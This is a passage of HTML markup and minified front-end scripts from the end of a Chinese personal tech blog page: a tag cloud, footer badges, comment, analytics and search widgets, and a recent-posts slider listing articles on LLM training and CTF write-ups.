HTTPS","path":"/tags/dns-over-https/","length":1},{"name":"Docker-mailserver","path":"/tags/docker-mailserver/","length":2},{"name":"Gulp","path":"/tags/gulp/","length":2},{"name":"Hexo","path":"/tags/hexo/","length":11},{"name":"对象存储","path":"/tags/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8/","length":2},{"name":"Markdown","path":"/tags/markdown/","length":1},{"name":"Butterfly主题","path":"/tags/butterfly%E4%B8%BB%E9%A2%98/","length":5},{"name":"Kimi Chat","path":"/tags/kimi-chat/","length":1},{"name":"GitHub","path":"/tags/github/","length":1},{"name":"GitHub Actions","path":"/tags/github-actions/","length":1},{"name":"MinIO","path":"/tags/minio/","length":1},{"name":"Hexo插件","path":"/tags/hexo%E6%8F%92%E4%BB%B6/","length":1},{"name":"GeekGame 2024","path":"/tags/geekgame-2024/","length":4},{"name":"Hackergame 2024","path":"/tags/hackergame-2024/","length":4},{"name":"PRNG","path":"/tags/prng/","length":5},{"name":"MT19937","path":"/tags/mt19937/","length":5},{"name":"LLM","path":"/tags/llm/","length":10},{"name":"MCP","path":"/tags/mcp/","length":2},{"name":"MCPM","path":"/tags/mcpm/","length":1},{"name":"BPE 算法","path":"/tags/bpe-%E7%AE%97%E6%B3%95/","length":1},{"name":"PPO 算法","path":"/tags/ppo-%E7%AE%97%E6%B3%95/","length":2},{"name":"强化学习","path":"/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/","length":5},{"name":"SFT","path":"/tags/sft/","length":1},{"name":"Reward Model","path":"/tags/reward-model/","length":1},{"name":"GRPO 算法","path":"/tags/grpo-%E7%AE%97%E6%B3%95/","length":1},{"name":"RLHF","path":"/tags/rlhf/","length":1}]' data-limit="40" data-fix-size="true" data-random-color="true" data-orderby="random" data-order="1">
    </div>
    <script>$(document).ready((function(){const t=document.getElementById("cloud-tags");if(!t)return;const e=JSON.parse(t.dataset.tags),n=parseInt(t.dataset.limit),a="true"===t.dataset.fixSize,o="true"===t.dataset.randomColor,r=t.dataset.orderby||"random",d=parseInt(t.dataset.order)||-1;let l,s=e.slice();"random"===r?s=s.sort((()=>.5-Math.random())):"name"===r?s.sort(((t,e)=>d*t.name.localeCompare(e.name))):"length"===r&&s.sort(((t,e)=>d*(t.length-e.length))),l=0!==n?s.slice(0,n):s;const m=[...new Set(l.map((t=>t.length)))],c=m.length-1;l.forEach((e=>{const n=c?m.indexOf(e.length)/c:0,r=a?12:12+12*n,d=o?Math.floor(101*Math.random())+100:144,l=o?Math.floor(101*Math.random())+100:144,s=o?Math.floor(101*Math.random())+100:144,i=document.createElement("a");i.href=e.path,i.textContent="#"+e.name,i.style=`\n            font-size: ${r}px;\n            color: rgb(${d}, ${l}, ${s});\n            background-color: rgba(${d}, ${l}, ${s}, 0.15);\n            margin: 0 5px 5px 0;\n            padding: 2px 6px;\n            border-radius: 10px;\n            text-decoration: none;\n            display: inline-block;\n          `,t.appendChild(i)}))}))</script>
  </div></details></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span style="font-family:sans-serif">&copy;</span>2020 - 2025 By WindShadow</div><div class="framework-info"><a target="_blank" rel="noopener" href="https://hexo.io/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-informational"></a><span class="footer-separator"> </span><a target="_blank" rel="noopener" href="https://butterfly.js.org/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-informational"></a><span class="footer-separator"> </span><a target="_blank" rel="noopener" href="https://github.com/lxgw/LxgwMarkerGothic"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Font-%E9%9C%9E%E9%B9%9C%E6%BC%AB%E9%BB%91-informational"></a></div><div class="footer_custom_text"><div> <a target="_blank" rel="noopener" href="https://github.com/windshadow233.github.io"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-GitHub-8A2BE2"></a> <span class="footer-separator"></span> <a href="/sitemap.xml" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Sitemap-XML-8A2BE2"></a> <span class="footer-separator"></span> <a href="/atom.xml" target="_blank"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Feed-Atom-8A2BE2"></a> <br> <a target="_blank" rel="noopener" href="https://www.nginx.com/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Nginx-red"></a> <span class="footer-separator"></span> <a target="_blank" rel="noopener" href="https://www.cloudflare.com/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Proxy-Cloudflare-red"></a> <span class="footer-separator"></span> <a target="_blank" rel="noopener" href="https://oss-console.fyz666.xyz/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/OSS-Self--Hosted-red"></a> <br> <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CC-BY--NC--SA%204.0-ff69b4"></a> <span class="footer-separator"></span> <a target="_blank" rel="noopener" href="https://icp.gov.moe/?keyword=20249801"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20249801-ff69b4?logo=data:image/png;base64,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"></a> <span class="footer-separator"></span> <a target="_blank" rel="noopener" href="https://letsencrypt.org/"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/SSL-Let's_Encrypt-ff69b4"></a> </div></div><div id="runtime-footer"><i class="fas fa-heart heartbeat"></i> 本站已持续运行<span></span></div><script>$(document).ready((function(){var n=new Date("2020-06-29T00:00:00.000Z"),e=document.querySelector("#runtime-footer span");function a(n){return n.toString().padStart(2,"0")}setInterval((function(){var r=new Date-n,t=Math.floor(r/864e5),s=Math.floor(r%864e5/36e5),o=Math.floor(r%36e5/6e4),c=Math.floor(r%6e4/1e3);e.innerHTML="<span class='numeric'>"+t+"</span>天<span class='numeric'>"+a(s)+"</span>小时<span class='numeric'>"+a(o)+"</span>分<span class='numeric'>"+a(c)+"</span>秒"}),1e3)}))</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href=""><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line menu-copy-link"><a class="rightMenu-item" href="javascript:rmf.copyPageLink()"><i class="fa fa-link"></i><span>复制本页链接</span></a></div><div class="rightMenu-group rightMenu-line hide menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.google.com/search?q=&quot;+window.getSelection().toString());"><i class="fab fa-google"></i><span>Google 一下</span></a><a class="rightMenu-item" href="javascript:rmf.searchinThisPage();"><i class="fas fa-search"></i><span>站内搜索</span></a></div><div class="rightMenu-group rightMenu-line hide menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" href="javascript:window.location=window.getSelection().toString();"><i class="fa fa-link"></i><span>前往此链接</span></a></div><div class="rightMenu-group rightMenu-line hide menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste();"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line menu-post hide menu-comment"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>直达评论区</span></a><a class="rightMenu-item" id="switch_commentBarrage" href="javascript:switchCommentBarrage();"><i class="iconfont icon-danmu"></i><span>开关评论弹幕</span></a><a class="rightMenu-item hide comment-select" href="javascript:rmf.commentSelect();"><i class="far fa-comment-alt"></i><span>评论所选内容</span></a></div><div class="rightMenu-group rightMenu-line hide menu-to"><a class="rightMenu-item" href="javascript:rmf.openInNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>前往此链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openImageInNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开图片</span></a><a class="rightMenu-item" href="javascript:rmf.copyImageLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>切换显示模式</span></a><a class="rightMenu-item" href="javascript:rmf.translate();"><i class="iconfont icon-fanti"></i><span>繁简转换</span></a><a class="rightMenu-item hide menu-read" href="javascript:rmf.switchReadMode();"><i class="fa fa-book"></i><span>阅读模式</span></a><a class="rightMenu-item" href="/link"><i class="fa-solid fa-user-group"></i><span>友情链接</span></a></div></div><div><script src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/utils.js?v=4.14.0-b1"></script><script src="/js/main.f283933f.js?v=4.14.0-b1"></script><script src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/tw_cn.js?v=4.14.0-b1"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><script src="https://fastly.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://fastly.jsdelivr.net/npm/vanilla-lazyload@19.0.5/dist/lazyload.iife.min.js"></script><script src="https://fastly.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>(()=>{const t=["post","post-info","recent-posts","archive","article-container","top","about-page","talk_page","equipment"],e=()=>{"object"==typeof pangu?t.forEach((t=>{pangu.spacingElementById(t)})):btf.getScript("https://fastly.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js").then((()=>{t.forEach((t=>{pangu.spacingElementById(t)}))}))},n=()=>{e()};btf.addGlobalFn("pjaxComplete",n,"pangu"),document.addEventListener("DOMContentLoaded",n)})()</script><div class="js-pjax"><div class="comment-barrage"></div><script>$(document).ready((function(){window.commentBarrageConfig={lightColors:[["var(--fyz-white-acrylic2)","var(--fyz-black)"]],darkColors:[["var(--fyz-black-acrylic2)","var(--fyz-white)"]],maxBarrage:3,barrageTime:3e3,twikooUrl:"https://twikoo.fyz666.xyz/",accessToken:"baafee2c7bf49d5967e7a05066e284ca",pageUrl:window.location.pathname,barrageTimer:[],barrageList:[],barrageIndex:0,noAvatarType:"retro",dom:document.querySelector(".comment-barrage"),displayBarrage:!0,avatarCDN:"cravatar.cn"},document.onscroll=function(){let e=document.getElementById("post-comment");null!==e&&commentBarrageConfig.displayBarrage&&(isInViewPortOfOne(e)?document.getElementsByClassName("comment-barrage")[0].setAttribute("style","display:none;"):document.getElementsByClassName("comment-barrage")[0].setAttribute("style",""))},initCommentBarrage()}))</script><script>(()=>{const t=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo.fyz666.xyz/",region:"",onCommentLoaded:()=>{btf.loadLightbox(document.querySelectorAll("#twikoo .tk-content img:not(.tk-owo-emotion)"))}},null)),GLOBAL_CONFIG_SITE.isPost&&(()=>{const t=document.getElementById("twikoo-count");t&&twikoo.getCommentsCount({envId:"https://twikoo.fyz666.xyz/",region:"",urls:[window.location.pathname],includeReply:!1}).then((o=>{t.textContent=o[0].count})).catch((t=>{console.error(t)}))})()},o=()=>{"object"==typeof twikoo?setTimeout(t,0):btf.getScript("https://fastly.jsdelivr.net/npm/twikoo@1.6.32/dist/twikoo.all.min.js").then(t)};o()})()</script><script>(()=>{const t=t=>"dark"===t?"dark_high_contrast":"light_high_contrast",a=()=>{const a=Object.assign({src:"https://giscus.app/client.js","data-repo":"windshadow233/BlogStorage","data-repo-id":"R_kgDOLhHf0w","data-category-id":"DIC_kwDOLhHf084Ce0EO","data-mapping":"pathname","data-theme":t(document.documentElement.getAttribute("data-theme")),"data-reactions-enabled":"1",crossorigin:"anonymous",async:!0},{"data-mapping":"og:title","data-input-position":"top","data-loading":"lazy","data-reactions-enabled":0,"data-lang":"zh-CN"}),e=document.createElement("script");for(let t in a)e.setAttribute(t,a[t]);document.getElementById("giscus-wrap").appendChild(e)};btf.addGlobalFn("themeChange",(a=>{(t=>{const a=document.querySelector("iframe.giscus-frame");a&&a.contentWindow.postMessage({giscus:t},"https://giscus.app")})({setConfig:{theme:t(a)}})}),"giscus"),a()})()</script></div><script>window.addEventListener("load",(()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <div class='name'><span>${e[n].nick} / </span><time datetime="${e[n].date}">${btf.diffDate(e[n].date,!0)}</time></div>\n        </div></div>`}else t+="没有评论";let n=document.querySelector("#card-newest-comments .aside-list");n&&(n.innerHTML=t),window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=btf.saveToLocal.get("twikoo-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{twikoo.getRecentComments({envId:"https://twikoo.fyz666.xyz/",region:"",pageSize:5,includeReply:!1}).then((function(t){const n=t.map((e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=(t=t.replace(/<blockquote.*?>(.*?)<\/blockquote>/gis,"[quote]")).replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[图片]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[链接]")).replace(/<pre><code>.*?<\/pre>/gi,"[代码]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.id,date:new Date(e.created).toISOString()};var t}));btf.saveToLocal.set("twikoo-newest-comments",JSON.stringify(n),5/1440),e(n)})).catch((function(e){document.querySelector("#card-newest-comments .aside-list").textContent="无法获取评论，请确认相关配置是否正确"}))};"object"==typeof twikoo?t():btf.getScript("https://fastly.jsdelivr.net/npm/twikoo@1.6.32/dist/twikoo.all.min.js").then(t)})()}};t(),btf.addGlobalFn("pjaxComplete",t,"twikoo_newestComment")}))</script><canvas id="universe-background"></canvas><div class="aplayer no-destroy" data-id="5103395209" data-fixed="true" data-autoplay="false" data-server="netease" data-order="random" data-listfolded="true" data-loop="all" data-volume="0.4" data-type="playlist"> </div><script async defer src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/universe.js"></script><script>function loadExternalResource(e,t){return new Promise(((s,i)=>{let n;"css"===t?(n=document.createElement("link"),n.rel="stylesheet",n.href=e):"js"===t&&(n=document.createElement("script"),n.src=e),n&&(n.onload=()=>s(e),n.onerror=()=>i(e),document.head.appendChild(n))}))}if(screen.width>=768){const e="/plugins/live2d/";Promise.all([loadExternalResource(e+"waifu.css","css"),loadExternalResource(e+"live2d.min.js","js"),loadExternalResource(e+"waifu-tips.js","js")]).then((()=>{initWidget({waifuPath:e+"waifu-tips.json",cdnPath:"https://fastly.jsdelivr.net/gh/fghrsh/live2d_api/",tools:["hitokoto","quit"]})}))}</script><link rel="stylesheet" href="/css/custom.0b644691.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/comment-barrage@v0.0.1.min.css"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script data-pjax>void 0!==window.LA&&LA.init({id:"JNnEmA8RDMZCf0Vf",ck:"JNnEmA8RDMZCf0Vf"})</script><script src="https://sdk.51.la/perf/js-sdk-perf.min.js" crossorigin="anonymous"></script><script data-pjax>void 0!==window.LingQue&&(new LingQue.Monitor).init({id:"KQWCzIs71YhLYfcB",sendSuspicious:!0,sendSpaPv:!0})</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://fastly.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://fastly.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://fastly.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors=['link[rel="canonical"]','meta[property="og:description"]','meta[name="description"]','meta[property="og:image"]','meta[property="og:title"]','meta[property="og:url"]',"head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});const triggerPjaxFn=e=>{e&&Object.values(e).forEach((e=>{e()}))};document.addEventListener("pjax:send",(function(){btf.removeGlobalFnEvent("pjax"),btf.removeGlobalFnEvent("themeChange");const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode"),triggerPjaxFn(window.globalFn.pjaxSend)})),document.addEventListener("pjax:complete",(()=>{document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),a=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(a)),e.parentNode.replaceChild(t,e)})),triggerPjaxFn(window.globalFn.pjaxComplete)})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404")}))</script><script async data-pjax src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/vercount@v0.1.0.js"></script><div class="docsearch-wrap"><div id="docsearch" style="display:none"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/docsearch.css"><script src="https://fastly.jsdelivr.net/npm/@docsearch/js@3.6.0/dist/umd/index.min.js"></script><script>(()=>{docsearch(Object.assign({appId:"U4K4JGBNYW",apiKey:"968e6158989f9e37080dc540e037e695",indexName:"fyz666",container:"#docsearch",transformItems:e=>e.map((e=>{const c=new URL(e.url);return{...e,url:c.pathname+c.search+c.hash}}))},{maxResultsPerGroup:20}));const e=()=>{document.querySelector(".DocSearch-Button").click()},c=()=>{btf.addEventListenerPjax(document.querySelector("#search-button > .search"),"click",e)};c(),window.addEventListener("pjax:complete",c)})()</script></div></div><script data-pjax>function butterfly_swiper_injector_config(){if(document.getElementById("swiper-container")){document.getElementById("swiper-container").insertAdjacentHTML("afterbegin",'<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/webp/c2a660aa-d2b3-4b68-9e65-841abf6e6584.webp);"><div class="blog-slider__content"><span class="blog-slider__code">2025-06-21</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/12634/&quot;);" href="javascript:void(0);" alt="">大语言模型训练原理与实践（零）：预训练</a><div class="blog-slider__text">从头训练一个小型大语言模型</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/webp/0105b834-95aa-4865-9188-29b1e008a929.webp);"><div class="blog-slider__content"><span class="blog-slider__code">2025-04-20</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/12471/&quot;);" href="javascript:void(0);" alt="">MCPM：让LLM调用你电脑上的一切工具</a><div class="blog-slider__text">MCPM：高效利用大语言模型的利器</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp);"><div class="blog-slider__content"><span class="blog-slider__code">2024-11-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/12095/&quot;);" href="javascript:void(0);" alt="">Hackergame 2024 题解（零）</a><div class="blog-slider__text">Hackergame 2024，再次喜提二等奖～</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/png/48f1d9cd-cd8c-4abd-ba92-7390d9ec1b32.png);"><div class="blog-slider__content"><span class="blog-slider__code">2024-10-18</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/11830/&quot;);" href="javascript:void(0);" alt="">GeekGame 2024 题解 (零)</a><div class="blog-slider__text">今年的GeekGame参赛人数好多，勉强拿个前百，来年再接再厉！</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/webp/998fed9b-e31d-43c4-87aa-5efa0d19bc14.webp);"><div class="blog-slider__content"><span class="blog-slider__code">2024-04-11</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/11025/&quot;);" href="javascript:void(0);" alt="">迁移WordPress到静态博客</a><div class="blog-slider__text">时隔四年，我终于把博客从WordPress迁移到了Hexo</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/png/69767e44-ab15-4b61-a5f5-a6567361e09b.png);"><div class="blog-slider__content"><span 